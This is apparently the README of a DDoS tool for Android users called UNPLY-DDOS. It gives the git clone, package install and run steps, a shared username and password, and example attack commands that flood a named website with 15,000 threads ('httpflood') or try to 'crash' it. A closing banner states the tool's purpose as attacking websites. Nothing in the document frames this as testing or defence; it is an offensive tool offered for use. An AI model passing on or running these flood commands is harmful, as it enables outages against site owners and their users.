# @h4cker_2097
# @h4cker_2097
𝘼𝘿𝙑𝘼𝙉𝘾𝙀 𝘿𝘿𝙊𝙎 𝙎𝘾𝙍𝙄𝙋𝙏 𝙁𝙊𝙍 𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝙐𝙎𝙀𝙍𝙎

         ╔═══════════════╗
         ║@h4cker_2097║    
         ╚═══════════════╝


     
     
              𝙐𝙉𝙋𝙇𝙔-𝘿𝘿𝙊𝙎   
     
        ╠═════════════════╣

# 𝙏𝙝𝙖𝙣𝙠𝙨 𝙁𝙤𝙧 𝙐𝙨𝙞𝙣𝙜 𝙊𝙪𝙧 @h4cker_2097  𝙏𝙤𝙤𝙡


➢ 𝙍𝙀𝙌𝙐𝙄𝙍𝙀𝙈𝙀𝙉𝙏𝙎 𝙁𝙊𝙍 𝙊𝙐𝙍 𝙏𝙊𝙊𝙇



➢ 𝙁𝙄𝙍𝙎𝙏 𝙐𝙋𝘼𝘿𝘼𝙏𝙀 𝙔𝙊𝙐𝙍𝙀 𝙏𝙀𝙍𝙈𝙐𝙓 𝙋𝘼𝘾𝙆𝘼𝙂𝙀𝙎


➢ 𝙋𝙔𝙏𝙃𝙊𝙉3


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

➢ 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 ➦

➢ 𝘾𝙇𝙊𝙉𝙀 𝙍𝙀𝙋𝙊 𝙐𝙎𝙄𝙉𝙂 - git clone https://github.com/UNEMPLOYEDHACKER/UNPLY-DDOS


➢ 𝘾𝙃𝘼𝙉𝙂𝙀 𝘿𝙄𝙍𝙀𝘾𝙏𝙊𝙍𝙔 - cd UNPLY-DDOS


➢𝙄𝙉𝙎𝙏𝘼𝙇𝙇 𝙍𝙀𝙌𝙐𝙄𝙍𝙀𝘿 𝙋𝘼𝘾𝙆𝘼𝙂𝙀𝙎 - pip install -r requirements.txt


➢𝙄𝙉𝙎𝙏𝘼𝙇𝙇 𝙂𝙊𝙇𝘼𝙉𝙂 𝙋𝘼𝘾𝙆𝘼𝙂𝙀 - pkg install golang


➢ 𝙍𝙐𝙉 𝙏𝙊𝙊𝙇 - python3 UNPLY-DDOS.py


𝙐𝙎𝙀𝙍 - h4cker_2097

𝙋𝘼𝙎𝙎 -h4cker_2097

    𝙎𝙊𝙈𝙀 𝙐𝙎𝙀𝙁𝙐𝙇 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 
    
   ❶ - httpflood [SITE_URL] THREADS GET/POST TIME
    
𝙀𝙓 - httpflood http://testfire.net/ 15000 get 120

 ❷ - crash URL GET/POST
𝙀𝙓 - crash http://testfire.net/ get

➢ 𝙎𝙋𝙀𝘾𝙄𝘼𝙇 𝙏𝙃𝘼𝙉𝙆𝙎 - [FAXAL](https://t.me/@Web403Found)

       ╔═════════════════╗
       ║    𝙁𝙊𝙐𝙉𝘿 𝙐𝙎𝙀      ║
       ║۞FUCK WEBSITE ✅۞ ║
       ╚═════════════════╝

[𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈](https://t.me/@h4cker_2097)
